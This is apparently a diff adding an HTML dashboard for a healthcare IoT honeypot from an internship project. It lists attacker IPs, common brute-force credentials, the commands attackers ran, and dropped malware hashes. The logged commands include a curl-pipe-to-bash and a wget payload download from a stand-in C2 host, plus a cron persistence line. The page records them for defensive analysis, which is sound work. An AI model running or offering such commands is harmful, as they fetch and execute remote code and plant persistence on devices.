@@ -1,0 +1,164 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>IoT Honeypot - Threat Analysis Dashboard</title>
+<style>
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body { font-family: 'Courier New', monospace; background: #0d1117; color: #c9d1d9; }
+  .header { background: #161b22; border-bottom: 1px solid #30363d; padding: 20px 30px; }
+  .header h1 { font-size: 20px; color: #58a6ff; }
+  .header p { font-size: 12px; color: #8b949e; margin-top: 4px; }
+  .container { max-width: 1200px; margin: 0 auto; padding: 24px; }
+  .metrics { display: grid; grid-template-columns: repeat(auto-fit, minmax(160px, 1fr)); gap: 16px; margin-bottom: 24px; }
+  .metric { background: #161b22; border: 1px solid #30363d; border-radius: 8px; padding: 16px; text-align: center; }
+  .metric .num { font-size: 32px; font-weight: bold; color: #58a6ff; }
+  .metric .label { font-size: 11px; color: #8b949e; margin-top: 4px; }
+  .metric.danger .num { color: #f85149; }
+  .metric.warn .num { color: #d29922; }
+  .metric.success .num { color: #3fb950; }
+  .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 16px; margin-bottom: 16px; }
+  .card { background: #161b22; border: 1px solid #30363d; border-radius: 8px; padding: 20px; }
+  .card h3 { font-size: 13px; color: #8b949e; text-transform: uppercase; letter-spacing: 0.05em; margin-bottom: 16px; border-bottom: 1px solid #30363d; padding-bottom: 8px; }
+  table { width: 100%; border-collapse: collapse; font-size: 12px; }
+  th { text-align: left; color: #8b949e; font-size: 11px; padding: 6px 0; border-bottom: 1px solid #30363d; }
+  td { padding: 7px 0; border-bottom: 1px solid #21262d; color: #c9d1d9; }
+  code { background: #0d1117; padding: 2px 6px; border-radius: 4px; color: #79c0ff; font-size: 11px; }
+  .badge-red { background: #3d1c1c; color: #f85149; padding: 2px 8px; border-radius: 4px; font-size: 10px; }
+  .badge-grn { background: #1c3d22; color: #3fb950; padding: 2px 8px; border-radius: 4px; font-size: 10px; }
+  .footer { text-align: center; padding: 20px; font-size: 11px; color: #8b949e; }
+  @media(max-width:700px){ .grid{ grid-template-columns:1fr; } }
+</style>
+</head>
+<body>
+
+<div class="header">
+  <h1>IoT Deception Honeypot — Threat Analysis Dashboard</h1>
+  <p>Device: VitalsMonitor-RPi4 | Healthcare IoT Honeypot | Infotact Internship Program</p>
+  <p style="margin-top:4px">Generated: 2026-05-28 13:16:45</p>
+</div>
+
+<div class="container">
+
+  <!-- Metric Cards -->
+  <div class="metrics">
+    <div class="metric danger">
+      <div class="num">7</div>
+      <div class="label">Unique Attacker IPs</div>
+    </div>
+    <div class="metric warn">
+      <div class="num">181</div>
+      <div class="label">Login Attempts</div>
+    </div>
+    <div class="metric danger">
+      <div class="num">5</div>
+      <div class="label">Successful Logins</div>
+    </div>
+    <div class="metric">
+      <div class="num">20</div>
+      <div class="label">Commands Executed</div>
+    </div>
+    <div class="metric danger">
+      <div class="num">3</div>
+      <div class="label">Malware Files Dropped</div>
+    </div>
+    <div class="metric">
+      <div class="num">234</div>
+      <div class="label">Total Events Logged</div>
+    </div>
+  </div>
+
+  <!-- Row 1 -->
+  <div class="grid">
+    <div class="card">
+      <h3>Attack Origins by Country</h3>
+      <table>
+        <tr><th>Country</th><th>Attacks</th><th>Bar</th></tr>
+        
+        <tr>
+          <td>United States</td>
+          <td>2</td>
+          <td><div style="background:#E24B4A;height:14px;width:87px;border-radius:3px"></div></td>
+        </tr>
+        <tr>
+          <td>Canada</td>
+          <td>1</td>
+          <td><div style="background:#E24B4A;height:14px;width:42px;border-radius:3px"></div></td>
+        </tr>
+        <tr>
+          <td>Lithuania</td>
+          <td>1</td>
+          <td><div style="background:#E24B4A;height:14px;width:42px;border-radius:3px"></div></td>
+        </tr>
+        <tr>
+          <td>The Netherlands</td>
+          <td>1</td>
+          <td><div style="background:#E24B4A;height:14px;width:42px;border-radius:3px"></div></td>
+        </tr>
+        <tr>
+          <td>Bulgaria</td>
+          <td>1</td>
+          <td><div style="background:#E24B4A;height:14px;width:42px;border-radius:3px"></div></td>
+        </tr>
+        <tr>
+          <td>Germany</td>
+          <td>1</td>
+          <td><div style="background:#E24B4A;height:14px;width:42px;border-radius:3px"></div></td>
+        </tr>
+      </table>
+    </div>
+    <div class="card">
+      <h3>Attacker IP Details</h3>
+      <table>
+        <tr><th>IP Address</th><th>Country</th><th>City</th><th>ISP</th></tr>
+        <tr><td>103.21.244.0</td><td>Canada</td><td>Toronto</td><td>CLOUDFLARE</td></tr><tr><td>194.165.16.29</td><td>Lithuania</td><td>Kaunas</td><td>Flyservers S.A.</td></tr><tr><td>89.248.167.131</td><td>The Netherlands</td><td>Amsterdam</td><td>IP Volume inc</td></tr><tr><td>91.92.109.47</td><td>Bulgaria</td><td>Sofia</td><td>VPS.BG</td></tr><tr><td>198.199.10.234</td><td>United States</td><td>Hurst</td><td>Bell Textron Inc</td></tr><tr><td>45.33.32.156</td><td>United States</td><td>Fremont</td><td>Akamai Technologies, Inc.</td></tr><tr><td>185.220.101.45</td><td>Germany</td><td>Brandenburg</td><td>Stiftung Erneuerbare Freiheit</td></tr>
+      </table>
+    </div>
+  </div>
+
+  <!-- Row 2 -->
+  <div class="grid">
+    <div class="card">
+      <h3>Top Passwords Attempted</h3>
+      <table>
+        <tr><th>Password</th><th>Count</th></tr>
+        <tr><td><code>admin</code></td><td>34</td></tr><tr><td><code>password</code></td><td>27</td></tr><tr><td><code>12345</code></td><td>22</td></tr><tr><td><code>pi</code></td><td>20</td></tr><tr><td><code>root</code></td><td>16</td></tr><tr><td><code>user</code></td><td>16</td></tr><tr><td><code></code></td><td>13</td></tr><tr><td><code>toor</code></td><td>13</td></tr>
+      </table>
+    </div>
+    <div class="card">
+      <h3>Top Usernames Attempted</h3>
+      <table>
+        <tr><th>Username</th><th>Count</th></tr>
+        <tr><td><code>root</code></td><td>105</td></tr><tr><td><code>pi</code></td><td>31</td></tr><tr><td><code>admin</code></td><td>29</td></tr><tr><td><code>user</code></td><td>16</td></tr>
+      </table>
+    </div>
+  </div>
+
+  <!-- Row 3 -->
+  <div class="grid">
+    <div class="card">
+      <h3>Commands Run by Attackers</h3>
+      <table>
+        <tr><th>Attacker IP</th><th>Command</th></tr>
+        <tr><td>45.33.32.156</td><td><code>ls /opt</code></td></tr><tr><td>45.33.32.156</td><td><code>uname -a</code></td></tr><tr><td>45.33.32.156</td><td><code>crontab -e</code></td></tr><tr><td>89.248.167.131</td><td><code>echo '* * * * * /tmp/payload.sh' >> /var/spool/cron/root</code></td></tr><tr><td>89.248.167.131</td><td><code>ls /opt</code></td></tr><tr><td>198.199.10.234</td><td><code>crontab -e</code></td></tr><tr><td>198.199.10.234</td><td><code>cat /opt/vitals-monitor/config.ini</code></td></tr><tr><td>89.248.167.131</td><td><code>curl http://malicious-c2.example.com/bot.sh | bash</code></td></tr><tr><td>89.248.167.131</td><td><code>wget http://malicious-c2.example.com/payload.sh -O /tmp/payload.sh</code></td></tr><tr><td>89.248.167.131</td><td><code>cat /opt/vitals-monitor/config.ini</code></td></tr>
+      </table>
+    </div>
+    <div class="card">
+      <h3>Malware / Files Dropped</h3>
+      <table>
+        <tr><th>IP</th><th>SHA256 Hash</th></tr>
+        <tr><td>45.33.32.156</td><td style='word-break:break-all;font-size:11px'>c5991e585864afda76931a4a904f5eb96bfbd35d070bb431684c59a81226c9fa</td></tr><tr><td>89.248.167.131</td><td style='word-break:break-all;font-size:11px'>2a091d62b2cd3de6f7dc519928a6328951de129ee6d029104dd2e6ff2d8e0e6e</td></tr><tr><td>91.92.109.47</td><td style='word-break:break-all;font-size:11px'>aeefd5330f9c9b3d6601d994b3fd71effe1fc9c0f5acb22f36eb87ab6689d64c</td></tr>
+      </table>
+    </div>
+  </div>
+
+</div>
+
+<div class="footer">
+  IoT Deception Honeypot — Healthcare Cyber Defence | Infotact Technical Internship Program<br>
+  HIPAA Compliance Evidence — Network Threat Intelligence Report
+</div>
+
+</body>
+</html>
